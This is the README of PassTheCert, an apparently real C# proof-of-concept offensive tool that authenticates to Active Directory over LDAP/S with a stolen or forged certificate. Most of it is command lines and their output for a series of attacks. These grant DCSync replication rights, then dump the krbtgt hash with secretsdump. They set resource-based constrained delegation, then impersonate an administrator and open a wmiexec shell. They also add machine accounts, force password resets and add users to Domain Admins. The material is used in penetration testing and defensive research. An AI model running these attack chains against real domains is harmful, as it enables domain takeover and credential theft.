# PassTheCert C#

## Presentation

This tool is a C# Proof-of-Concept allowing an attacker to use a certificate
to authenticate to an LDAP/S server through Schannel.

More information in the [accompanying blog post](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html).

## Building

Simply build the solution with Visual Studio.

## Usage

Here are the general options for `PassTheCert`. Attack specific options are
given below.

```console
C:\> .\PassTheCert.exe --help
PassTheCert.exe [--help] --server DOMAIN_CONTROLLER [--start-tls] --cert-path CERT_PATH [--cert-password CERT_PASSWORD] (--elevate|--rbcd|--add-computer) [ATTACK_OPTIONS]
GENERAL OPTIONS:
        --server DOMAIN_CONTROLLER
                Domain controller to connect to. By default, connection will be done over TCP/636 (LDAPS).
        --start-tls
                Indicates that connection should instead be done over TCP/389 (LDAP) and then use StartTLS.
        --cert-path CERT_PATH
                Path to the certificate to authenticate with.
        --cert-password CERT_PASSWORD
                Password to the certificate (Optional argument. Default value: <empty>).

ATTACK TYPE:
        --whoami
                Query LDAP whoami to check if strict validation is being checked
        --elevate
                Elevate the rights of a user on the domain. Will grant DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights.
        --rbcd
                Adds an SID to the msDS-AllowedToActOnBehalfOfOtherIdentity arttribute of the target.
        --add-computer
                Add a new computer to the domain (useful for RBCD attacks).
        --reset-password
                Reset the password of the targeted account (requires the User-Force-Change-Password right).
```

### Whoami

There's no options for this attack. Here's an example of usage:

```console
C:\> .\PassTheCert.exe --server srv-ad.contoso.com --cert-path Z:\skywalker.pfx --whoami
Querying LDAP As : u:CONTOSO\skywalker
```

### Elevate user

The options for this attack are:

```
ELEVATE ATTACK OPTIONS: --target TARGET (--sid SID|--restore RESTORE_FILE)
        --target TARGET
                Target of the attack. Should be the distinguished name of the domain.
        --sid SID
                SID to elevate.
        --restore RESTORE_FILE
                File from which to restore the msDS-nTSecurityDescriptor attribute.
                You can use --restore clear to clear the attribute.
```

Here's an example of usage:

```console
C:\> .\PassTheCert.exe --server srv-ad.contoso.com --cert-path Z:\exchange_server.pfx --elevate --target "DC=contoso,DC=com" --sid S-1-5-21-863927164-4106933278-53377030-2627
nTSecurityDescriptor attribute exists. Saving old value to disk.
You can restore it using arguments:
        --target "DC=contoso,DC=com" --restore DC=contoso,DC=com_nTSecurityDescriptor_20220428T144216Z.txt
Success
```

You can see that the previous value of `nTSecurityDescriptor` was saved to a
file. **Do not lose it** so that you can restore the previous value once your
attack is done.

You can now perform DCSync with the account with SID `S-1-5-21-863927164-4106933278-53377030-2627`:

```console
$ secretsdump.py -just-dc-ntlm -just-dc-user krbtgt "contoso.com/stormtroopers:$PASSWORD@srv-ad.contoso.com"
Impacket v0.9.25.dev1+20220218.140931.6042675a - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:201b0450d2fba51c****************:::
[*] Cleaning up...
```

To restore the previous `nTSecurityDescriptor` on the domain object, use the
command given by the tool:

```console
C:\> .\PassTheCert.exe --server srv-ad.contoso.com --cert-path Z:\skywalker.pfx --elevate --target "DC=contoso,DC=com" --restore '.\DC=contoso,DC=com_nTSecurityDescriptor_20220428T144216Z.txt'
Restoring nTSecurityDescriptor attribute from file .\DC=contoso,DC=com_nTSecurityDescriptor_20220428T144216Z.txt.
Success
```

### RBCD

The options for this attack are:

```
RBCD ATTACK OPTIONS: --target TARGET (--sid SID|--restore RESTORE_FILE)
        --target TARGET
                Target of the attack. Should be the distinguished name of the computer.
        --sid SID
                SID to grant RBCD rights to.
        --restore RESTORE_FILE
                File from which to restore the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.
                You can use --restore clear to clear the attribute.
```

Here's an example of usage:

```console
C:\> .\PassTheCert.exe --server srv-ad.contoso.com --cert-path Z:\srv-ad.pfx --rbcd --target "CN=SRV-AD,OU=Domain Controllers,DC=contoso,DC=com" --sid S-1-5-21-863927164-4106933278-53377030-3131
msDS-AllowedToActOnBehalfOfOtherIdentity attribute is empty
You can clear it using arguments:
        --target "CN=SRV-AD,OU=Domain Controllers,DC=contoso,DC=com" --restore clear
Success
```

You can now perform an [RBCD attack](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)
against the target:

```console
$ getST.py -spn "cifs/srv-ad.contoso.com" -impersonate Administrateur "contoso.com/desktop-1337$:$PASSWORD"
Impacket v0.9.25.dev1+20220218.140931.6042675a - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating Administrateur
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in Administrateur.ccache
$ export KRB5CCNAME=Administrateur.ccache
$ wmiexec.py -k -no-pass contoso.com/Administrateur@srv-ad.contoso.com                                                            
Impacket v0.9.25.dev1+20220218.140931.6042675a - Copyright 2021 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
contoso\administrateur
```

Similar to the [Elevate attack](#elevate-user) attack, you have a `--restore`
option to restore the previous value of the `msDS-AllowedToActOnBehalfOfOtherIdentity`
attribute of the target. If the previous value is not empty, it will be saved
to disk. It if was empty, you can use ``--restore clear` to restore the
attribute to its empty value.

### Add computer

The options for this attack are:

```
ADD COMPUTER ATTACK OPTIONS: --computer-name COMPUTER_NAME [--computer-password COMPUTER_PASSWORD]
        --computer-name COMPUTER_NAME
                The name of the computer to add.
        --computer-password COMPUTER_PASSWORD
                The password of the new computer (Optional argument. Default value: <random value>).
```

Here's an example of usage:

```console
C:\> .\PassTheCert.exe --server srv-ad.contoso.com --cert-path Z:\stormtroopers.pfx --add-computer --computer-name DESKTOP-1337$ --computer-password "P@ssword01"
Success
```

If no password is provided, a random one will be generated:

```console
C:\> .\PassTheCert.exe --server srv-ad.contoso.com --cert-path Z:\stormtroopers.pfx --add-computer --computer-name DESKTOP-1337$
No password given, generating random one.
Generated password: hqMELrSZXLyOQ1KGLQQoxE7LM78dU9Mb
Success
```

### Reset password

The options for this attack are:

```
RESET PASSWORD ATTACK OPTIONS: --target TARGET [--new-password NEW_PASSWORD]
        --target TARGET
                Target of the attack. Should be the distinguished name of the account.
        --new-password new_PASSWORD
                The new password of the account (Optional argument. Default value: <random value>).
```

Here's an example of usage:

```console
C:\> .\PassTheCert.exe --server srv-ad.contoso.com --cert-path Z:\skywalker.pfx --reset-password --target "CN=Stormtroopers,OU=Empire,OU=Utilisateurs,DC=contoso,DC=com" --new-password P@ssword01
Success
```

If no password is provided, a random one will be generated:

```console
C:\> .\PassTheCert.exe --server srv-ad.contoso.com --cert-path Z:\skywalker.pfx --reset-password --target "CN=Stormtroopers,OU=Empire,OU=Utilisateurs,DC=contoso,DC=com"
No password given, generating random one.
Generated password: m6QQ3OfbULmyiwBsNJS9NzvlVER8rWj7
Success
```

### Add account to group

The options for this attack are:

```
ADD ACCOUNT TO GROUP ATTACK OPTIONS: --target TARGET --account ACCOUNT
        --target TARGET
                Target of the attack. Should be the distinguished name of the group.
        --account ACCOUNT
                The account added to the group. Should be the distinguished name of the account.
```

Here's an example of usage:
```console
C:\> .\PassTheCert.exe --server srv-ad.contoso.com --cert-path Z:\skywalker.pfx --add-account-to-group --target "CN=Domain Admins,CN=Users,DC=contoso,DC=com" --account "CN=simple_user,CN=Users,DC=contoso,DC=com"
Success
```

### Toggle AD user account enabled/disabled

The options for this attack are:

```
TOGGLE ENABLE USER ACCOUNT OPTIONS: --account ACCOUNT --toggle-enabled
        --account ACCOUNT
                The account added enabled/disabled. Should be the distinguished name of the account.
        
```

Here's an example of usage:
```console
C:\> .\PassTheCert.exe --server srv-ad.contoso.com --cert-path Z:\skywalker.pfx --account "CN=simple_user,CN=Users,DC=contoso,DC=com --toggle-enabled"
Account status toggled. Result: Success

```